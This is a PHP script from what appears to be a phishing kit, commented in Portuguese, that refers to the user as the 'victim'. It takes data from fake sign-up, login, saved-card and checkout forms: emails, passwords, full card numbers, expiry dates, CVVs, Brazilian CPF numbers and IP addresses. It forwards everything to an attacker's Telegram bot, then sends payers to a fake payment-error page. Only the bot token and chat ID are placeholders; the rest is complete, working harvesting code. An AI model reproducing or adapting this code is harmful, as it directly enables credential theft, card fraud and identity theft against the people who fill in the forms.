<?php
// CONFIGURAÇÕES DO TELEGRAM
$botToken = "SEU_BOT_TOKEN_AQUI";
$chatId = "SEU_CHAT_ID_AQUI";

// Captura o IP e User Agent da vítima
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

// Identifica a operação através do campo oculto 'tipo_operacao'
$tipo = isset($_POST['tipo_operacao']) ? $_POST['tipo_operacao'] : 'PAGAMENTO';

$mensagem = "";

if ($tipo == "CADASTRO") {
    $nome = $_POST['nome'] ?? 'Não informado';
    $email = $_POST['email'] ?? 'Não informado';
    $senha = $_POST['senha'] ?? 'Não informada';
    
    $mensagem = "🆕 *NOVO CADASTRO*\n\n";
    $mensagem .= "👤 Nome: $nome\n";
    $mensagem .= "📧 Email: $email\n";
    $mensagem .= "🔑 Senha: $senha\n";
    $mensagem .= "🌐 IP: $ip\n";
    
    $redirecionar = "conta.html";

} elseif ($tipo == "LOGIN") {
    $email = $_POST['email'] ?? 'Não informado';
    $senha = $_POST['senha'] ?? 'Não informada';
    
    $mensagem = "🔑 *TENTATIVA DE LOGIN*\n\n";
    $mensagem .= "📧 Email: $email\n";
    $mensagem .= "🔑 Senha: $senha\n";
    $mensagem .= "🌐 IP: $ip\n";
    
    $redirecionar = "conta.html";

} elseif ($tipo == "CARTAO_SALVO") {
    $nome = $_POST['card-name'] ?? 'Não informado';
    $numero = $_POST['card-number'] ?? 'Não informado';
    $validade = $_POST['card-expiry'] ?? 'Não informado';
    $cvv = $_POST['card-cvv'] ?? 'Não informado';
    
    $mensagem = "💳 *CARTÃO SALVO NO PERFIL*\n\n";
    $mensagem .= "👤 Nome: $nome\n";
    $mensagem .= "💳 Cartão: $numero\n";
    $mensagem .= "📅 Validade: $validade\n";
    $mensagem .= "🔐 CVV: $cvv\n";
    $mensagem .= "🌐 IP: $ip\n";
    
    $redirecionar = "conta.html";

} else {
    // Fluxo de Pagamento
    $nome =$_POST['card-name'] ?? 'Não informado';
    $cpf = $_POST['card-cpf'] ?? 'Não informado';
    $numero = $_POST['card-number'] ?? 'Não informado';
    $validade = $_POST['card-expiry'] ?? 'Não informado';
    $cvv = $_POST['card-cvv'] ?? 'Não informado';
    $total = $_POST['total'] ?? 'Não informado';
    
    $mensagem = "💳 *NOVO PAGAMENTO*\n\n";
    $mensagem .= "👤 Nome: $nome\n";
    $mensagem .= "🆔 CPF: $cpf\n";
    $mensagem .= "💳 Cartão: $numero\n";
    $mensagem .= "📅 Validade: $validade\n";
    $mensagem .= "🔐 CVV: $cvv\n";
    $mensagem .= "💰 Total: $total\n";
    $mensagem .= "🌐 IP: $ip\n";
    
    $redirecionar = "erro-no-pagamento.html";
}

// Envio para o Telegram via cURL
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $mensagem,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Redirecionamento final
header("Location: $redirecionar");
exit();
?>
